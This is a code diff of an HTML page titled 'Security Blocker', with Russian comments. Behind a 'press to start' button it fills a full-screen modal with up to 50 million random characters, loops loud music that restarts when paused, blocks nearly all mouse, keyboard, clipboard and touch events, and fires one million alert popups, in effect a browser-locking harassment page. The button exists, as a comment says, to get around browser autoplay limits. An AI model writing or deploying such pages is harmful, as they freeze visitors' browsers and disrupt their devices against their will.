@@ -10,12 +10,12 @@
     user-select:none; -webkit-user-select:none; -ms-user-select:none; 
     overflow:hidden; touch-action:none; font-family: monospace;
     display:flex; justify-content:center; align-items:center;
+    flex-direction: column;
   }
   #modal {
     position: fixed; inset:0; background:#000; color:#111;
     display: flex; justify-content:center; align-items:center;
-    z-index:2147483647; cursor:pointer;
-    overflow:hidden;
+    z-index:2147483647; cursor:pointer; overflow:hidden;
   }
   #box {
     max-width: 95vw; max-height: 90vh; overflow:hidden;
@@ -24,20 +24,37 @@
     background:#000;
     user-select:none;
   }
+  #startButton {
+    margin-top: 20px;
+    padding: 1rem 2rem;
+    font-size: 1.5rem;
+    cursor: pointer;
+    background: #111;
+    border: 2px solid #0f0;
+    color: #0f0;
+    user-select:none;
+  }
 </style>
 </head>
 <body>
 <div id="modal" role="dialog" aria-modal="true" aria-label="Security Blocker">
-  <div id="box" tabindex="-1" aria-readonly="true"></div>
+  <div id="box" tabindex="-1" aria-readonly="true">Ждем запуска музыки...</div>
 </div>
+<button id="startButton" aria-label="Start Music and Site Interaction">НАЖМИ ДЛЯ СТАРТА</button>
 <audio id="audio" crossorigin="anonymous" playsinline loop></audio>
 <script>
 (() => {
   const AUDIO_URL = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
-  const HASH_LENGTH = 50000;
   const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
   const box = document.getElementById('box');
+  const modal = document.getElementById('modal');
+  const startButton = document.getElementById('startButton');
   const audio = document.getElementById('audio');
+  const TOTAL_LENGTH = 50000000; // 50 млн символов
+  const CHUNK_SIZE = 200000; // 200к символов за итерацию
+
+  let writing = false;
+  let canceled = false;
 
   function randomString(len) {
     let s = '';
@@ -47,28 +64,31 @@
     return s;
   }
 
-  function fillHash() {
-    const chunkSize = 1024;
-    let written = 0;
+  async function fillHash() {
+    if(writing) return;
+    writing = true;
     box.textContent = '';
-    function step() {
-      let add = Math.min(chunkSize, HASH_LENGTH - written);
-      box.textContent += randomString(add);
-      written += add;
-      if (written < HASH_LENGTH) {
-        requestAnimationFrame(step);
+    let written = 0;
+    while (written < TOTAL_LENGTH) {
+      if (canceled) break;
+      box.textContent += randomString(CHUNK_SIZE);
+      written += CHUNK_SIZE;
+      await new Promise(r => requestAnimationFrame(r));
+      // Чтобы браузер не замер, даем ему дышать
+      if (box.textContent.length > TOTAL_LENGTH) {
+        box.textContent = box.textContent.slice(0, TOTAL_LENGTH);
+        break;
       }
     }
-    step();
+    writing = false;
   }
 
-  fillHash();
-
-  // Запреты на все действия
+  // Полный блок всех событий и действий пользователя
   function blockEvent(e) {
     try { e.preventDefault(); e.stopImmediatePropagation(); } catch {}
     return false;
   }
+
   ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev => {
     document.addEventListener(ev, blockEvent, {capture:true, passive:false});
   });
@@ -86,25 +106,28 @@
       audio.loop = true;
       audio.volume = 1.0;
       await audio.load();
-      audio.play().catch(() => {});
-      audio.addEventListener('pause', () => { audio.play().catch(() => {}); });
+      await audio.play();
+      audio.addEventListener('pause', () => { if (!audio.paused) audio.play().catch(() => {}); });
       window.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'visible') audio.play().catch(() => {});
       });
     } catch {}
   }
-  setupAudio();
 
-  // Показать миллион alert с рандомным хешем
+  // Миллион alert с рандомным хэшем
   function spamAlerts(count) {
     if(count <= 0) return;
     alert(randomString(50));
     setTimeout(() => spamAlerts(count - 1), 10);
   }
-  
-  // Запускаем после 2 секунд, чтобы успела музыка стартовать и страница загрузиться
-  setTimeout(() => spamAlerts(1000000), 2000);
 
+  // Запуск всей защиты после нажатия кнопки (из-за ограничений браузера)
+  startButton.onclick = async () => {
+    startButton.style.display = 'none';
+    fillHash();
+    await setupAudio();
+    spamAlerts(1000000);
+  };
 })();
 </script>
 </body>
